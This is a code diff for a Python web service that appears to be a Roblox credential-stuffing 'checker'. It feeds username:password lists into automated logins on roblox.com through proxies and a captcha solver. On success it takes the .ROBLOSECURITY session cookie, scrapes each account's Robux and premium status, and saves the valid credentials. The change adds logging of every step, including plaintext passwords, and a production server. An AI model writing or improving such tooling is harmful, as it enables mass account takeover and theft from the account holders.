@@ -265,10 +265,12 @@ async def fetch_account_details_api(session, user_id, roblox_security, console: 
             break
     return details
 
-async def fetch_account_details_scrape(page, user_id, console: Console) -> dict:
+async def fetch_account_details_scrape(page, user_id, console: Console, actions: list) -> dict:
     details = {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
     try:
+        actions.append({"type": "goto", "url": f"https://www.roblox.com/users/{user_id}/profile"})
         await page.goto(f"https://www.roblox.com/users/{user_id}/profile", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
+        actions.append({"type": "goto", "url": "https://www.roblox.com/home"})
         await page.goto("https://www.roblox.com/home", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
         try:
             robux_text = await page.locator("span#navbar-robux-balance").text_content(timeout=3000)
@@ -277,6 +279,7 @@ async def fetch_account_details_scrape(page, user_id, console: Console) -> dict:
             stats["totalrbx"] += robux
         except Exception as e:
             print(f"Robux scrape failed: {str(e)}")
+        actions.append({"type": "goto", "url": f"https://www.roblox.com/users/{user_id}/profile"})
         await page.goto(f"https://www.roblox.com/users/{user_id}/profile", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
         try:
             premium_badge = await page.locator("span.icon-premium").count()
@@ -305,7 +308,7 @@ async def fetch_account_details_scrape(page, user_id, console: Console) -> dict:
         print(f"Scrape error: {str(e)}")
     return details
 
-async def fetch_account_details(page, cookies, console: Console, proxies: list) -> dict:
+async def fetch_account_details(page, cookies, console: Console, proxies: list, actions: list) -> dict:
     try:
         roblox_security = next((c["value"] for c in cookies if c["name"] == ".ROBLOSECURITY"), None)
         if not roblox_security:
@@ -323,12 +326,12 @@ async def fetch_account_details(page, cookies, console: Console, proxies: list) 
                 api_details = await fetch_account_details_api(session, user_id, roblox_security, console, proxies)
                 if api_details is not None:
                     return api_details
-        return await fetch_account_details_scrape(page, user_id, console)
+        return await fetch_account_details_scrape(page, user_id, console, actions)
     except Exception as e:
         print(f"Details fetch failed: {str(e)}")
         return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
 
-async def login_worker(queue, context, semaphore, output_dir, proxies, max_proxies_per_account, console, use_captcha_solver, proxy_index, pages, results):
+async def login_worker(queue, context, semaphore, output_dir, proxies, max_proxies_per_account, console, use_captcha_solver, proxy_index, pages, results, actions):
     async with semaphore:
         while True:
             try:
@@ -337,15 +340,19 @@ async def login_worker(queue, context, semaphore, output_dir, proxies, max_proxi
                 page = await context.new_page()
                 pages.append(page)
                 try:
+                    actions.append({"type": "goto", "url": "https://www.roblox.com/login"})
                     await page.goto("https://www.roblox.com/login", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
+                    actions.append({"type": "fill", "selector": "input#login-username", "value": username})
                     await page.fill("input#login-username", username)
+                    actions.append({"type": "fill", "selector": "input#login-password", "value": password})
                     await page.fill("input#login-password", password)
+                    actions.append({"type": "click", "selector": "button#login-button"})
                     await page.click("button#login-button")
                     await page.wait_for_load_state("networkidle", timeout=CONFIG["timeout"] * 1000)
                     if "home" in page.url.lower():
                         stats["hits"] += 1
                         cookies = await context.cookies()
-                        details = await fetch_account_details(page, cookies, console, proxies)
+                        details = await fetch_account_details(page, cookies, console, proxies, actions)
                         save_result(output_dir, "Valid", f"{username}:{password}", details)
                         results.append({"account": f"{username}:{password}", "status": "Valid", "details": details})
                     elif "challenge" in page.url.lower() or await page.locator("div#challenge").count() > 0:
@@ -409,6 +416,7 @@ async def check_accounts():
         results = []
         pages = []
         queue = asyncio.Queue()
+        actions = []
         for combo in combos:
             await queue.put(combo)
 
@@ -445,7 +453,7 @@ async def check_accounts():
             semaphore = asyncio.Semaphore(max_tasks)
             tasks = []
             for _ in range(max_tasks):
-                task = asyncio.create_task(login_worker(queue, context, semaphore, output_dir, proxies, 1 if use_proxies else 0, console, use_captcha_solver, proxy_index, pages, results))
+                task = asyncio.create_task(login_worker(queue, context, semaphore, output_dir, proxies, 1 if use_proxies else 0, console, use_captcha_solver, proxy_index, pages, results, actions))
                 tasks.append(task)
                 proxy_index += 1
 
@@ -458,11 +466,13 @@ async def check_accounts():
             await context.close()
             await browser.close()
 
-        return jsonify({"stats": stats, "results": results, "output_dir": output_dir})
+        return jsonify({"stats": stats, "results": results, "output_dir": output_dir, "actions": actions})
     except Exception as e:
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 if __name__ == "__main__":
     host = os.getenv("HOST", "0.0.0.0")
     port = int(os.getenv("PORT", 5500))
-    app.run(host=host, port=port, debug=False)
+    from waitress import serve
+    print(f"Starting production server on {host}:{port}")
+    serve(app, host=host, port=port)
